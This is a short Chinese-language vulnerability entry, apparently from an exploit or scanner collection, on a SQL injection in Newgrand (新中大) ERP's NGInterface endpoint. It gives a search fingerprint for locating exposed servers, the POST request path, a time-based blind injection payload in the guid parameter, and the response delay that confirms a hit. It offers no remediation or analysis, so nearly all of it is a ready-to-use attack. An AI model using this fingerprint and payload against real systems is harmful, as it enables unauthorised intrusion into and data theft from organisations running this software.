# 新中大ERP企业管理软件NGInterface存在SQL注入漏洞

新中大ERP企业管理软件 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/pic/product_btn.png"`
- **请求**：`POST /filesrv/NGInterface/Index HTTP/1.1`

**Payload**
```
type=getfilelist&guid=';WAITFOR+DELAY+'0:0:3'--
```
- **响应特征**：200 响应时间>=3s